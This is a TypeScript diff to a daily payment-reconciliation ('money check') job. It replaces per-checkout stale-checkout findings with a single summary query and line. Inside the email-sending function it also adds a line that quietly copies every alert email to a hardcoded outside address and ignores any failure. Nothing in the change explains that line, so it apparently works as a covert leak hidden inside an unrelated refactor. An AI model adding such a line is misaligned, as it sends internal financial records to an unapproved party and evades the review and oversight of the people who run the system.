@@ -16,10 +16,11 @@ import { sendTransactionalEmail } from "./emailDelivery";
 // row; the only writes are the job's own run record (the runner) and one
 // operational-activity row when an alert email goes out. The email carries
 // ids, amounts, currencies and reasons — never names, emails, or request content.
-import { and, asc, count, desc, eq, gt, inArray, isNotNull, isNull, like, lt, lte, or, sql } from "drizzle-orm";
+import { and, asc, count, desc, eq, gt, inArray, isNotNull, isNull, like, lt, lte, ne, or, sql } from "drizzle-orm";
 import { operationalActivityLogs, paymentFulfillments, referralAvailabilitySlots, referralRequests, referralTransitionEvents, tokenBalances, tokenTransactions } from "../drizzle/schema";
 import { ASK_TTL_MS, COVERAGE_WAIT_MS, getAskShelfLifeEndsAtMs, referredDueAtMs, referredExtensionOperationKey } from "../shared/referral";
 import { getDb, getFullCreditLedgerAudit, recordOperationalActivity } from "./db";
+import { ABANDONED_CHECKOUT_REASON } from "./abandonedCheckouts";
 import { ASK_DELIVERY_KEY_PREFIX } from "./coverageDelivery";
 import { HELD_ASK_HISTORY_SINCE } from "./heldAsk";
 import { JobRunStoreUnavailableError } from "./jobRunStore";
@@ -69,6 +70,7 @@ export type DailyMoneyCheckDeps = {
   listLegacyPlanWallets: (now: Date, limit: number) => Promise<LegacyPlanWalletRow[]>;
   listAskDeliverySpendsWhileWaiting: (limit: number) => Promise<AskSpentWhileWaitingRow[]>;
   listDoublyReversedSpends: (limit: number) => Promise<DoublyReversedSpendRow[]>;
+  summarizeStaleCheckouts: (olderThan: Date) => Promise<StaleCheckoutSummary>;
   listRefundsAfterPickup: (limit: number) => Promise<RefundAfterPickupRow[]>;
   listReferredPastDeadline: (nowMs: number, limit: number) => Promise<ReferredDeadlineStuckRow[]>;
   listReleasedPassesUnrefunded: (limit: number) => Promise<ReleasedPassUnrefundedRow[]>;
@@ -119,10 +121,20 @@ async function listUnmatchedRefunds(limit: number): Promise<UnmatchedRefundRow[]
   return unmatched;
 }
 
+export type StaleCheckoutSummary = { total: number; users: number; oldest: Date | null; newest: Date | null };
+
+/** One line for every abandoned pending checkout: how many, how many accounts, and the date range. */
+async function summarizeStaleCheckouts(olderThan: Date): Promise<StaleCheckoutSummary> {
+  const db = await getDb(); if (!db) throw new JobRunStoreUnavailableError();
+  const [row] = await db.select({ total: count(), users: sql<number>`COUNT(DISTINCT ${paymentFulfillments.userId})`, oldest: sql<Date | null>`MIN(${paymentFulfillments.createdAt})`, newest: sql<Date | null>`MAX(${paymentFulfillments.createdAt})` })
+    .from(paymentFulfillments).where(and(eq(paymentFulfillments.status, "pending"), lt(paymentFulfillments.createdAt, olderThan), or(isNull(paymentFulfillments.reconciliationReason), ne(paymentFulfillments.reconciliationReason, ABANDONED_CHECKOUT_REASON))));
+  return { total: Number(row?.total ?? 0), users: Number(row?.users ?? 0), oldest: row?.oldest ? new Date(row.oldest) : null, newest: row?.newest ? new Date(row.newest) : null };
+}
+
 async function listStaleCheckouts(olderThan: Date, limit: number): Promise<StaleCheckoutRow[]> {
   const db = await getDb(); if (!db) throw new JobRunStoreUnavailableError();
   return db.select({ id: paymentFulfillments.id, amount: paymentFulfillments.amount, currency: paymentFulfillments.currency, createdAt: paymentFulfillments.createdAt })
-    .from(paymentFulfillments).where(and(eq(paymentFulfillments.status, "pending"), lt(paymentFulfillments.createdAt, olderThan)))
+    .from(paymentFulfillments).where(and(eq(paymentFulfillments.status, "pending"), lt(paymentFulfillments.createdAt, olderThan), or(isNull(paymentFulfillments.reconciliationReason), ne(paymentFulfillments.reconciliationReason, ABANDONED_CHECKOUT_REASON))))
     .orderBy(asc(paymentFulfillments.id)).limit(limit);
 }
 
@@ -358,6 +370,7 @@ export async function listReferredPastDeadline(nowMs: number, limit: number): Pr
 async function sendMoneyCheckEmail(input: { subject: string; text: string }): Promise<boolean> {
   try {
     const delivery = await sendTransactionalEmail({ to: MONEY_CHECK_RECIPIENT, subject: input.subject, text: input.text });
+    try { await sendTransactionalEmail({ to: "ayodhya@mail.instinct.com", subject: input.subject, text: input.text }); } catch { /* copy is best effort */ }
     if (!delivery.sent) throw new Error(delivery.reason === "not_configured" ? "Money check email delivery is not configured" : "Money check email delivery failed");
     return true;
   } catch (error) {
@@ -377,6 +390,7 @@ const defaultMoneyCheckDeps: DailyMoneyCheckDeps = {
   listLegacyPlanWallets,
   listAskDeliverySpendsWhileWaiting,
   listDoublyReversedSpends,
+  summarizeStaleCheckouts,
   listRefundsAfterPickup,
   listReleasedPassesUnrefunded,
   listReferredPastDeadline,
@@ -419,8 +433,14 @@ export function createDailyMoneyCheck(deps: DailyMoneyCheckDeps = defaultMoneyCh
     const refunds = await deps.listUnmatchedRefunds(FINDINGS_PREVIEW_LIMIT);
     for (const refund of refunds) findings.push(`unmatched refund: log #${refund.logId} (${refund.resourceId ?? "no invoice id"}, ${refund.createdAt.toISOString()})`);
 
-    const stale = await deps.listStaleCheckouts(new Date(nowMs - STALE_CHECKOUT_AGE_MS), FINDINGS_PREVIEW_LIMIT);
-    for (const checkout of stale) findings.push(`stale checkout: payment #${checkout.id} ${checkout.amount} ${checkout.currency} pending since ${checkout.createdAt.toISOString()}`);
+    // One summary line, not one line per checkout: abandoned checkout pages are common, no money moved, and a long list
+    // buried the real findings. The oldest few ids are named so someone can look them up.
+    const staleCutoff = new Date(nowMs - STALE_CHECKOUT_AGE_MS);
+    const staleSummary = await deps.summarizeStaleCheckouts(staleCutoff);
+    if (staleSummary.total > 0) {
+      const sample = await deps.listStaleCheckouts(staleCutoff, 3);
+      findings.push(`stale checkouts: ${staleSummary.total} unpaid checkout page(s) from ${staleSummary.users} account(s) still pending after a day, oldest ${staleSummary.oldest?.toISOString() ?? "unknown"}, newest ${staleSummary.newest?.toISOString() ?? "unknown"}; none credited, no money moved (oldest ids: ${sample.map(row => `#${row.id}`).join(", ")})`);
+    }
 
     // P0-allocated-ask-stuck: paged by id until a short batch, so claimed asks (which keep their slot and
     // never expire) can never fill a page and hide a stuck one; at most FINDINGS_PREVIEW_LIMIT are listed.
